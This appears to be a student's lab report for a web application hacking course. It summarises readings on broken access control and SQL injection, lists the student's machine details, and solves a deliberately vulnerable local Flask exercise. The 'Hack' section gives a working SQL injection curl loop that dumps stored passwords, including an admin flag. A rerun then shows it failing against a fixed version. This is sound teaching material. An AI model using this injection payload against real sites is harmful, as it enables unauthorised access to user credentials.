# Application Hacking Report

## x) Read/watch/listen and summarize

*This content was written by me and refined for clarity using AI assistance.*

* OWASP: OWASP Top 10: [A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) is a failure to enforce a policy where users cannot act outside of their intended permissions. Think of it like a hotel where your room key accidentally opens the penthouse, the manager's office, and the safe.

* Karvinen 2023: [Find Hidden Web Directories - Fuzz URLs with ffuf](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/) Web servers often contain directories (like `/.svn/`, `/admin`, or `/backup`) that are not linked from the main homepage. Fuzzing is the automated process of testing thousands of possible directory names to find these hidden paths.

* PortSwigger: [Access control vulnerabilities and privilege escalation](https://portswigger.net/web-security/access-control) Access control is a security system that decides if a user has permission to view certain pages or perform specific actions. Problems occur when these rules are weak, allowing people to access private data or admin tools they should not see. For example, some users might find hidden links to change settings or view other people's personal accounts by changing simple details in a web address. To keep a website safe, developers should always block access by default and check every request carefully to make sure the user is truly allowed to be there.

* Karvinen 2006: [Report Writing (in Finnish)](https://terokarvinen.com/2006/raportin-kirjoittaminen-4/) Sorry, I have to skip this as my Finnish skill is not good enough to understand the whole report.

* Optional: PortSwigger 2020: [What is SQL injection? - Web Security Academy (about 10 min video)](https://www.youtube.com/watch?v=wX6tszfgYp4) SQL injection is a dangerous security problem that happens when a person interferes with the commands a website sends to its database. By typing special characters, an attacker can trick the system into showing private information, such as other people's passwords or hidden product details. Sometimes, they can even log in as an administrator without knowing the correct password by making the system ignore the security checks. While some of these problems are easy to find, others are "blind" and require more complex methods like timing the website's response to guess the data. To prevent these attacks, developers should use a safe coding method called "parameterized queries," which ensures that user input is never treated as part of the actual database command.

## a) Break into 010-staff-only. See Karvinen 2024: [Hack'n Fix](https://terokarvinen.com/hack-n-fix/)

### Environment

* OS and generic hardware info:

```
> systeminfo

Host Name:                     ALIENWARE
OS Name:                       Microsoft Windows 11 Pro
OS Version:                    10.0.26200 N/A Build 26200
OS Manufacturer:               Microsoft Corporation
OS Configuration:              Standalone Workstation
OS Build Type:                 Multiprocessor Free
Registered Owner:              sherlock.nth@live.com
Registered Organization:
Product ID:                    00330-80000-00000-AA193
Original Install Date:         12/22/2024, 5:58:42 PM
System Boot Time:              1/17/2026, 1:58:48 PM
System Manufacturer:           Alienware
System Model:                  Alienware m15 R2
System Type:                   x64-based PC
Processor(s):                  1 Processor(s) Installed.
                               [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2592 Mhz
BIOS Version:                  Alienware 1.25.0, 12/14/2023
Windows Directory:             C:\WINDOWS
System Directory:              C:\WINDOWS\system32
Boot Device:                   \Device\HarddiskVolume1
System Locale:                 en-us;English (United States)
Input Locale:                  en-us;English (United States)
Time Zone:                     (UTC+02:00) Helsinki, Kyiv, Riga, Sofia, Tallinn, Vilnius
Total Physical Memory:         16,174 MB
Available Physical Memory:     5,184 MB
Virtual Memory: Max Size:      50,990 MB
Virtual Memory: Available:     29,263 MB
Virtual Memory: In Use:        21,727 MB
Page File Location(s):         C:\pagefile.sys
Domain:                        WORKGROUP
Logon Server:                  \\ALIENWARE
Hotfix(s):                     4 Hotfix(s) Installed.
                               [01]: KB5066128
                               [02]: KB5054156
                               [03]: KB5074109
                               [04]: KB5071142
Network Card(s):               3 NIC(s) Installed.
                               [01]: Killer(R) Wi-Fi 6 AX1650w 160MHz Wireless Network Adapter (200D2W)
                                     Connection Name: Wi-Fi
                                     DHCP Enabled:    Yes
                                     DHCP Server:     192.168.1.1
                                     IP address(es)
                                     [01]: 192.168.1.252
                                     [02]: fe80::81c7:ed7e:9157:5026
                               [02]: Killer E3000 2.5 Gigabit Ethernet Controller
                                     Connection Name: Ethernet
                                     Status:          Media disconnected
                               [03]: Bluetooth Device (Personal Area Network)
                                     Connection Name: Bluetooth Network Connection
                                     Status:          Media disconnected
Virtualization-based security: Status: Running
                               Required Security Properties:
                               Available Security Properties:
                                     Base Virtualization Support
                                     Secure Boot
                                     DMA Protection
                                     UEFI Code Readonly
                                     SMM Security Mitigations 1.0
                                     Mode Based Execution Control
                               Services Configured:
                               Services Running:
                               App Control for Business policy: Enforced
                               App Control for Business user mode policy: Off
                               Security Features Enabled:
Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

* OS (hosting vulnerable website): Running with WSL2

```sh
❯ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 24.04.3 LTS
Release:        24.04
Codename:       noble
```

* Browser

```
Google Chrome	143.0.7499.193 (Official Build) (64-bit) (cohort: 144.0.7559.96 Rollout) 
Revision	fc6af963edebc86a5d6779e29b94312ebe911538-refs/branch-heads/7499@{#4084}
OS	Windows 11 Version 25H2 (Build 26200.7623)
JavaScript	V8 14.3.127.17
User Agent	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
```

* Network

```
❯ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 10.255.255.254/32 brd 10.255.255.254 scope global lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:6b:8f:d9 brd ff:ff:ff:ff:ff:ff
    inet 172.17.186.107/20 brd 172.17.191.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::215:5dff:fe6b:8fd9/64 scope link
       valid_lft forever preferred_lft forever
```

### Hack

```
❯ printf "%d\n" {0..10} | xargs -I{} curl -X POST -d "pin=%27+OR+1%3D1+LIMIT+1+OFFSET+{}+--" http://127.0.0.1:5000 | grep "Your password is <b>.*</b>"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1018  100   982  100    36   236k   8877 --:--:-- --:--:-- --:--:--  248k
                <p>Your password is <b>foo</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1023  100   987  100    36   326k  12186 --:--:-- --:--:-- --:--:--  499k
                <p>Your password is <b>Somedude</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1078  100  1042  100    36   274k   9698 --:--:-- --:--:-- --:--:--  350k
                <p>Your password is <b>SUPERADMIN%%rootALL-FLAG{Tero-e45f8764675e4463db969473b6d0fcdd}</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1025  100   989  100    36   262k   9777 --:--:-- --:--:-- --:--:--  333k
                <p>Your password is <b>loremipsum</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   331k  12349 --:--:-- --:--:-- --:--:--  500k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   339k  12627 --:--:-- --:--:-- --:--:--  500k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   299k  11135 --:--:-- --:--:-- --:--:--  333k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   363k  13523 --:--:-- --:--:-- --:--:--  500k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   293k  10912 --:--:-- --:--:-- --:--:--  333k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1026  100   990  100    36   250k   9328 --:--:-- --:--:-- --:--:--  333k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1029  100   992  100    37   311k  11885 --:--:-- --:--:-- --:--:--  334k
                <p>Your password is <b>(not found)</b></p>
```

The admin password is **SUPERADMIN%%rootALL-FLAG{Tero-e45f8764675e4463db969473b6d0fcdd}**

## b) Fix the 010-staff-only vulnerability from source code. Demonstrate with a test that your solution works.

The fix is in [010-staff-only/staff-only-fixed.py](010-staff-only/staff-only-fixed.py) file.

Start the server

```
❯ python3 staff-only-fixed.py
WARNING: Purposefully VULNERABLE APP!
 * Serving Flask app 'staff-only-fixed'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

Retry the hack

```
❯ printf "%d\n" {0..10} | xargs -I{} curl -X POST -d "pin=%27+OR+1%3D1+LIMIT+1+OFFSET+{}+--" http://127.0.0.1:5000 | grep "Your password is <b>.*</b>"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36  23075    872 --:--:-- --:--:-- --:--:-- 24700
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   225k   8739 --:--:-- --:--:-- --:--:--  241k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   284k  11029 --:--:-- --:--:-- --:--:--  321k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   260k  10072 --:--:-- --:--:-- --:--:--  321k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   320k  12400 --:--:-- --:--:-- --:--:--  482k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   309k  11984 --:--:-- --:--:-- --:--:--  482k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   335k  12982 --:--:-- --:--:-- --:--:--  482k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   301k  11669 --:--:-- --:--:-- --:--:--  321k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   208k   8088 --:--:-- --:--:-- --:--:--  241k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   988  100   952  100    36   305k  11834 --:--:-- --:--:-- --:--:--  321k
                <p>Your password is <b>(not found)</b></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   990  100   953  100    37   322k  12833 --:--:-- --:--:-- --:--:--  483k
                <p>Your password is <b>(not found)</b></p>
```

Now the user must enter the correct pin to get the password.

## c) Solve dirfuzt-1 from the article Karvinen 2023: [Find Hidden Web Directories - Fuzz URLs with ffuf](https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/)
TBD
## d) Break into 020-your-eyes-only. See Karvinen 2024: [Hack'n Fix](https://terokarvinen.com/hack-n-fix/)
TBD
## e) Fix the 020-your-eyes-only vulnerability. Demonstrate with a test that your solution works.
TBD
